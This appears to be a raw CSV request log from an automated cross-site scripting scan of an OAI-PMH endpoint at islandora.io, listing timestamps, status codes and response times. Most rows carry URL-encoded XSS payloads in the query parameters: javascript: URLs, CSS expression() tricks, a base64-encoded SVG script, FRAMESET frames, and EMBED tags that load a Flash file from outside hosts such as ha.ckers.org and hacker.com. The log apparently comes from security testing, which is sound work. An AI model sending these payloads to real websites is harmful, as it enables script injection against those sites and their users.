uuid,timestamp,http_status_code,request_url,response_time,http_version
ef79780f-abaa-48f9-aa86-83cb723da789,2025-01-28 14:44:12,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E&metadataPrefix=oai_dc,61.93 ms,HTTP/1.1
9eb48ca8-bb75-4161-a07f-ab3e98c0371e,2025-01-28 14:44:12,200,http://islandora.io/oai/request?verb=%3CBR+SIZE%3D%22%26%7Bjavascript%3Aalert%281%29%7D%22%3E,54.89 ms,HTTP/1.1
36e37180-99b1-438a-8e79-2aeb06136f39,2025-01-28 14:44:12,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3CBR+SIZE%3D%22%26%7Bjavascript%3Aalert%281%29%7D%22%3E,62.87 ms,HTTP/1.1
c9a7b568-3e90-4491-932d-ab207691e8bc,2025-01-28 14:44:13,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3CBR+SIZE%3D%22%26%7Bjavascript%3Aalert%281%29%7D%22%3E,67.14 ms,HTTP/1.1
3c94c6cf-80f5-490e-8d9e-298c45d98a7b,2025-01-28 14:44:13,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3CBR+SIZE%3D%22%26%7Bjavascript%3Aalert%281%29%7D%22%3E,84.77 ms,HTTP/1.1
ccacc8a0-d6e8-480c-94d7-b7fee6ea5015,2025-01-28 14:44:14,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CBR+SIZE%3D%22%26%7Bjavascript%3Aalert%281%29%7D%22%3E&set=%3CBR+SIZE%3D%22%26%7Bjavascript%3Aalert%281%29%7D%22%3E,47.99 ms,HTTP/1.1
a2f6b9cd-493f-4693-9d80-41754376653a,2025-01-28 14:44:14,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CBR+SIZE%3D%22%26%7Bjavascript%3Aalert%281%29%7D%22%3E&metadataPrefix=marc,34.73 ms,HTTP/1.1
f9d675b2-e4d9-4722-9e0d-d213238cef56,2025-01-28 14:44:14,200,http://islandora.io/oai/request?verb=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E,60.99 ms,HTTP/1.1
00e4f584-e4b8-4a7d-8d4e-af41a1b5664a,2025-01-28 14:44:15,200,http://islandora.io/oai/request?verb=ListMetadataFormats,39.92 ms,HTTP/1.1
e851d2a4-2138-4fd8-8af8-9dba3edbd8e5,2025-01-28 14:44:15,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E,48.56 ms,HTTP/1.1
8b6b723d-8d8b-437d-b754-f269daeea40e,2025-01-28 14:44:15,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,66.24 ms,HTTP/1.1
0427e21c-c31e-42e8-ab77-16de0583fb17,2025-01-28 14:44:16,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E&set=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E,66.74 ms,HTTP/1.1
6c373d99-1340-4974-a440-666a7eb2724a,2025-01-28 14:44:16,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E&metadataPrefix=marc,70.43 ms,HTTP/1.1
6a560b54-89d0-464d-b4f0-13f7383d80a3,2025-01-28 14:44:16,200,http://islandora.io/oai/request?verb=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E,70.77 ms,HTTP/1.1
b366ddff-6122-4f23-941a-e096cde7d5d6,2025-01-28 14:44:17,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E,69.41 ms,HTTP/1.1
1dd63fd4-3ff0-4a01-854c-e50460c6d51a,2025-01-28 14:44:17,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E,68.06 ms,HTTP/1.1
8dc48010-04fe-48bd-b54f-1cdd225f5bef,2025-01-28 14:44:18,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,55.87 ms,HTTP/1.1
b10c510c-bf5b-4baa-845e-11b68560e822,2025-01-28 14:44:18,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E,116.18 ms,HTTP/1.1
5afd450b-ff8d-454e-aa4f-2332966a6593,2025-01-28 14:44:18,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E&metadataPrefix=oai_dc,60.61 ms,HTTP/1.1
ce7c3744-6976-4f59-963b-be6d2fe1de8d,2025-01-28 14:44:19,200,http://islandora.io/oai/request?verb=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Ajavascript%3Aalert%281%29%29%22%3E,60.53 ms,HTTP/1.1
cc3fc551-cc66-4655-aab6-dd1c83f3a1d2,2025-01-28 14:44:19,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Ajavascript%3Aalert%281%29%29%22%3E,54.80 ms,HTTP/1.1
d24e0812-252b-43dd-b308-e50fca1a607a,2025-01-28 14:44:19,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Ajavascript%3Aalert%281%29%29%22%3E,39.76 ms,HTTP/1.1
4a3b3f3f-daf8-4444-bcb3-52845bb80b47,2025-01-28 14:44:20,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Ajavascript%3Aalert%281%29%29%22%3E,67.56 ms,HTTP/1.1
de429895-185e-4334-bccd-6055172897ab,2025-01-28 14:44:20,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Ajavascript%3Aalert%281%29%29%22%3E&set=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Ajavascript%3Aalert%281%29%29%22%3E,71.25 ms,HTTP/1.1
f971e300-fc77-41e4-be4d-7089acd82d79,2025-01-28 14:44:20,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Ajavascript%3Aalert%281%29%29%22%3E&metadataPrefix=marc,48.77 ms,HTTP/1.1
c9392ad8-e4a3-4e84-9dcd-13124fa92440,2025-01-28 14:44:21,200,http://islandora.io/oai/request?verb=%3CDIV+STYLE%3D%22background-image%3A%5C0075%5C0072%5C006C%5C0028%27%5C006a%5C0061%5C0076%5C0061%5C0073%5C0063%5C0072%5C0069%5C0070%5C0074%5C003a%5C0061%5C006c%5C0065%5C0072%5C0074%5C0028.1027%5C0058.1053%5C0053%5C0027%5C0029%27%5C0029%22%3E,65.85 ms,HTTP/1.1
17ae98a8-48f6-40f0-8fa1-9ab048fd1d01,2025-01-28 14:44:21,200,http://islandora.io/oai/request?verb=ListMetadataFormats,42.09 ms,HTTP/1.1
3a0a97f8-1ec9-40e8-a193-546b1f6a6284,2025-01-28 14:44:22,200,http://islandora.io/oai/request?verb=ListSets,53.52 ms,HTTP/1.1
041b0336-2c96-4188-8c82-cc02e96e4dfb,2025-01-28 14:44:22,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3CDIV+STYLE%3D%22background-image%3A%5C0075%5C0072%5C006C%5C0028%27%5C006a%5C0061%5C0076%5C0061%5C0073%5C0063%5C0072%5C0069%5C0070%5C0074%5C003a%5C0061%5C006c%5C0065%5C0072%5C0074%5C0028.1027%5C0058.1053%5C0053%5C0027%5C0029%27%5C0029%22%3E&set=%3CDIV+STYLE%3D%22background-image%3A%5C0075%5C0072%5C006C%5C0028%27%5C006a%5C0061%5C0076%5C0061%5C0073%5C0063%5C0072%5C0069%5C0070%5C0074%5C003a%5C0061%5C006c%5C0065%5C0072%5C0074%5C0028.1027%5C0058.1053%5C0053%5C0027%5C0029%27%5C0029%22%3E,50.64 ms,HTTP/1.1
cc30e801-e5a2-47d2-87d8-5f0986dac0dc,2025-01-28 14:44:22,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3CDIV+STYLE%3D%22background-image%3A%5C0075%5C0072%5C006C%5C0028%27%5C006a%5C0061%5C0076%5C0061%5C0073%5C0063%5C0072%5C0069%5C0070%5C0074%5C003a%5C0061%5C006c%5C0065%5C0072%5C0074%5C0028.1027%5C0058.1053%5C0053%5C0027%5C0029%27%5C0029%22%3E,66.20 ms,HTTP/1.1
594469b4-8d40-44db-bcc0-43cdcc3fc026,2025-01-28 14:44:23,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CDIV+STYLE%3D%22background-image%3A%5C0075%5C0072%5C006C%5C0028%27%5C006a%5C0061%5C0076%5C0061%5C0073%5C0063%5C0072%5C0069%5C0070%5C0074%5C003a%5C0061%5C006c%5C0065%5C0072%5C0074%5C0028.1027%5C0058.1053%5C0053%5C0027%5C0029%27%5C0029%22%3E&metadataPrefix=oai_dc,61.23 ms,HTTP/1.1
cbbc4bf1-0d0f-4ce3-b682-abd390aabba5,2025-01-28 14:44:23,200,http://islandora.io/oai/request?verb=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E,60.86 ms,HTTP/1.1
573c3f3a-2e81-4658-8301-bcd9e779693a,2025-01-28 14:44:23,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E,62.46 ms,HTTP/1.1
2dc8dff7-d902-4f41-b295-dac807283964,2025-01-28 14:44:24,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E,73.92 ms,HTTP/1.1
274105ce-a468-44e4-b3f1-25eb36941a37,2025-01-28 14:44:24,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E&set=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E,70.96 ms,HTTP/1.1
811b56bf-6ca0-4c8d-9cf7-d7501de0d17c,2025-01-28 14:44:24,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E&until=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E,43.82 ms,HTTP/1.1
8041c9af-ea9c-458a-a638-c446f8d77ed4,2025-01-28 14:44:25,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E&metadataPrefix=marc,61.36 ms,HTTP/1.1
96fc2447-8477-4c2d-be06-23a4ba6ec50c,2025-01-28 14:44:25,200,http://islandora.io/oai/request?verb=%3CDIV+STYLE%3D%22width%3Aexpression%28javascript%3Aalert%281%29%29%3B%22%3E,52.21 ms,HTTP/1.1
9144b42a-cc43-47a8-a1b0-f3d22d3368f5,2025-01-28 14:44:26,200,http://islandora.io/oai/request?verb=ListMetadataFormats,49.12 ms,HTTP/1.1
8225d7ea-c558-4dd8-9d4b-074fad6bb3bf,2025-01-28 14:44:26,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3CDIV+STYLE%3D%22width%3Aexpression%28javascript%3Aalert%281%29%29%3B%22%3E,43.52 ms,HTTP/1.1
b13f0f92-90dc-40cc-b539-c27e3d159978,2025-01-28 14:44:26,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3CDIV+STYLE%3D%22width%3Aexpression%28javascript%3Aalert%281%29%29%3B%22%3E,68.77 ms,HTTP/1.1
e515219c-a16d-4f2e-89d4-f875aa594427,2025-01-28 14:44:27,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CDIV+STYLE%3D%22width%3Aexpression%28javascript%3Aalert%281%29%29%3B%22%3E&set=%3CDIV+STYLE%3D%22width%3Aexpression%28javascript%3Aalert%281%29%29%3B%22%3E,64.67 ms,HTTP/1.1
12b3127a-61b9-4e63-ba4a-62fd001ef7b4,2025-01-28 14:44:27,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CDIV+STYLE%3D%22width%3Aexpression%28javascript%3Aalert%281%29%29%3B%22%3E&metadataPrefix=marc,68.77 ms,HTTP/1.1
c5bb5066-8729-4739-b2d6-2b21c5de6533,2025-01-28 14:44:27,200,http://islandora.io/oai/request?verb=%3CEMBED+SRC%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dH+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv+MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs+aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw+IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22+type%3D%22image%2Fsvg%2Bxml%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E,57.16 ms,HTTP/1.1
62614564-5825-4b89-9e55-0e4196b5f85f,2025-01-28 14:44:28,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3CEMBED+SRC%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dH+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv+MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs+aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw+IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22+type%3D%22image%2Fsvg%2Bxml%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E,65.78 ms,HTTP/1.1
703fb3dc-95a7-47c9-9917-b18d0e1cd1dd,2025-01-28 14:44:28,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3CEMBED+SRC%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dH+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv+MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs+aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw+IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22+type%3D%22image%2Fsvg%2Bxml%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E,68.35 ms,HTTP/1.1
7d0d923d-312c-4ce4-841b-b48ee25dc8f9,2025-01-28 14:44:28,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3CEMBED+SRC%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dH+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv+MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs+aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw+IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22+type%3D%22image%2Fsvg%2Bxml%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E,65.65 ms,HTTP/1.1
87821573-f22d-48a3-a115-a90e47f5ea3f,2025-01-28 14:44:29,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CEMBED+SRC%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dH+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv+MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs+aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw+IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22+type%3D%22image%2Fsvg%2Bxml%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&set=%3CEMBED+SRC%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dH+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv+MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs+aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw+IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22+type%3D%22image%2Fsvg%2Bxml%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E,51.61 ms,HTTP/1.1
427432dd-0f3c-4e08-939a-1463f63a6e6b,2025-01-28 14:44:29,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CEMBED+SRC%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dH+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv+MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs+aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw+IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22+type%3D%22image%2Fsvg%2Bxml%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&metadataPrefix=marc,48.85 ms,HTTP/1.1
4ff188fd-b2ba-40d3-a686-27b49c2d35f8,2025-01-28 14:44:30,200,http://islandora.io/oai/request?verb=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E,69.63 ms,HTTP/1.1
79c89ebd-244e-4116-93e5-d7dec813af06,2025-01-28 14:44:30,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E,74.90 ms,HTTP/1.1
6c82b49b-642d-4c9e-a1cc-c6865e1e042a,2025-01-28 14:44:30,200,http://islandora.io/oai/request?verb=ListSets,53.38 ms,HTTP/1.1
d560857e-2935-40dd-bb13-fe338ec95815,2025-01-28 14:44:31,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&until=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&set=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E,81.39 ms,HTTP/1.1
88565fad-c8f0-4cfd-821a-281789edd947,2025-01-28 14:44:31,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&until=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&set=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E,57.77 ms,HTTP/1.1
79966129-d906-4298-907e-d1c9ad5fba7a,2025-01-28 14:44:31,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&metadataPrefix=marc,66.79 ms,HTTP/1.1
722cd331-e621-4e36-bf88-9b6c2b6ae2b3,2025-01-28 14:44:32,200,http://islandora.io/oai/request?verb=%3CEMBED+SRC%3D%22http%3A%2F%2Fhacker.com%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E,52.33 ms,HTTP/1.1
3037e8c2-2ecd-4682-952d-78757f40baaf,2025-01-28 14:44:32,200,http://islandora.io/oai/request?verb=ListMetadataFormats,49.25 ms,HTTP/1.1
a3387a19-ef68-4ccf-8b82-55a1cd5d07a5,2025-01-28 14:44:32,200,http://islandora.io/oai/request?verb=ListSets,42.07 ms,HTTP/1.1
4043a00c-65bc-4ab4-be75-1248307d4f4f,2025-01-28 14:44:33,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CEMBED+SRC%3D%22http%3A%2F%2Fhacker.com%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E&until=%3CEMBED+SRC%3D%22http%3A%2F%2Fhacker.com%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E,60.53 ms,HTTP/1.1
de8d0a1f-6ef1-47a0-bb55-bee14760e0fb,2025-01-28 14:44:33,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3CEMBED+SRC%3D%22http%3A%2F%2Fhacker.com%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E&set=%3CEMBED+SRC%3D%22http%3A%2F%2Fhacker.com%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E,48.60 ms,HTTP/1.1
b2fda652-f05e-45f6-8b6e-d62c0995468e,2025-01-28 14:44:34,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CEMBED+SRC%3D%22http%3A%2F%2Fhacker.com%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E&metadataPrefix=marc,58.55 ms,HTTP/1.1
ceb5d8ea-5874-48f8-a375-b8b741bed4ab,2025-01-28 14:44:34,200,http://islandora.io/oai/request?verb=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E,62.91 ms,HTTP/1.1
e4fe41f8-5fa0-4907-8cbc-ab844a328092,2025-01-28 14:44:34,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E,60.06 ms,HTTP/1.1
87f15169-3790-44d3-8c08-c527606355fb,2025-01-28 14:44:35,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E,70.50 ms,HTTP/1.1
2ad46994-0735-4a2e-9a64-5437e186f066,2025-01-28 14:44:35,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E&until=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E,69.36 ms,HTTP/1.1
8c346789-75e9-4c27-bf6c-1583e8ddfc83,2025-01-28 14:44:35,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E&set=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E,72.38 ms,HTTP/1.1
d9b7ee4a-903d-418a-956b-ecce1817cde5,2025-01-28 14:44:36,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E&metadataPrefix=marc,57.23 ms,HTTP/1.1
ee5af666-e376-4b62-af55-5ed5214f2e38,2025-01-28 14:44:36,200,http://islandora.io/oai/request?verb=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fframeset%3E,62.11 ms,HTTP/1.1
176a357d-5e25-4626-a058-feab86bdd462,2025-01-28 14:44:37,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fframeset%3E,53.79 ms,HTTP/1.1
95ae4076-cf79-44b8-9245-e1d9aabeab58,2025-01-28 14:44:37,200,http://islandora.io/oai/request?verb=ListSets,32.43 ms,HTTP/1.1
